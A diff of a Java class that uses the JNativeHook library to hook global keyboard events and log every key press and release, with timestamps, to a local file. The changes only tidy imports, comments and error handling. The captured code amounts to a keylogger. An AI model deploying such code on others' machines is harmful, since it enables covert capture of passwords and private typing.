@@ -1,30 +1,15 @@
-/*
- * To change this license header, choose License Headers in Project Properties.
- * To change this template file, choose Tools | Templates
- * and open the template in the editor.
- */
 package jnativehookexample;
 
 import java.io.BufferedWriter;
-import java.io.File;
 import java.io.FileWriter;
 import java.io.IOException;
 import java.io.PrintWriter;
-import java.net.InetAddress;
-import java.net.NetworkInterface;
-import java.net.SocketException;
-import java.net.UnknownHostException;
 import java.util.Calendar;
-import java.util.TimerTask;
 import org.jnativehook.GlobalScreen;
 import org.jnativehook.NativeHookException;
 import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
 
-/**
- *
- * @author x
- */
 public class KeyListener implements NativeKeyListener {
 
     String s1="\\tekst"+System.currentTimeMillis();
@@ -52,7 +37,7 @@ public class KeyListener implements NativeKeyListener {
     out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode())+ " "+ mHour+":"+mMin+":"+mSec+ " " + mDay +"/"+ mMonth +"/"+ mYear);
 
 } catch (IOException ex) {
-    //exception handling left as an exercise for the reader
+    System.out.println("Key Pressed error"+ex);
 }
 
         
@@ -94,7 +79,7 @@ public class KeyListener implements NativeKeyListener {
     out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()) + " "+ mHour+":"+mMin+":"+mSec+ " " + mDay +"/"+ mMonth +"/"+ mYear);
 
 } catch (IOException ex) {
-    //exception handling left as an exercise for the reader
+        System.out.println("Key Released error" + ex);
 }
 
     }
